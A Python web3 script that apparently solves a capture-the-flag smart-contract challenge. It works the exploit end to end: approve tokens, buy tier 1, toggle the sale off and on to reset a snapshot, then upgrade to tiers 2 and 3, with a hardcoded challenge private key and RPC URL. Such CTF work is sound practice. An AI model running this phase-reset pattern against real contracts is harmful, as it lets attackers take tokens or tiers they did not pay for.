from web3 import Web3
from eth_account import Account

# === FILL THESE IN FROM THE HTTP ENDPOINT ===
RPC_URL = "http://challenges.1pc.tf:38200/8f3faf30-0e3c-41af-9013-fb4c746cd1a3"  # Get from endpoint
PRIVATE_KEY = "ba8b41395e41fab86bfac98537cc8e93a84f9387247219771e29220dde9a96d1"   # Get from endpoint
SETUP_ADDRESS = "0xde3D09620104323b1e96b773b783fa8A4bdC481d" # Get from endpoint

# Connect
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)
player = account.address

print(f"Player address: {player}")
print(f"Balance: {w3.eth.get_balance(player)}")

# Setup contract ABI (minimal)
setup_abi = '[{"inputs":[{"internalType":"bool","name":"_tge","type":"bool"}],"name":"enableTge","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"tge","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]'

# TGE ABI
tge_abi = '[{"inputs":[],"name":"buy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tier","type":"uint256"}],"name":"upgrade","outputs":[],"stateMutability":"nonpayable","type":"function"}]'

# Token ABI
token_abi = '[{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'

# Get contracts
setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
tge_address = setup.functions.tge().call()
token_address = setup.functions.token().call()

tge = w3.eth.contract(address=tge_address, abi=tge_abi)
token = w3.eth.contract(address=token_address, abi=token_abi)

print(f"TGE: {tge_address}")
print(f"Token: {token_address}")

# Helper to send transaction
def send_tx(func):
    tx = func.build_transaction({
        'from': player,
        'nonce': w3.eth.get_transaction_count(player),
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"TX: {tx_hash.hex()} - Status: {receipt['status']}")
    return receipt

# Execute exploit
print("\n=== Starting Exploit ===")

print("1. Approving tokens...")
send_tx(token.functions.approve(tge_address, 15))

print("2. Buying Tier 1...")
send_tx(tge.functions.buy())

print("3. Closing TGE (snapshot)...")
send_tx(setup.functions.enableTge(False))

print("4. Reopening TGE...")
send_tx(setup.functions.enableTge(True))

print("5. Upgrading to Tier 2...")
send_tx(tge.functions.upgrade(2))

print("6. Upgrading to Tier 3...")
send_tx(tge.functions.upgrade(3))

print("\n=== Checking Solution ===")
solved = setup.functions.isSolved().call()
print(f"Solved: {solved}")


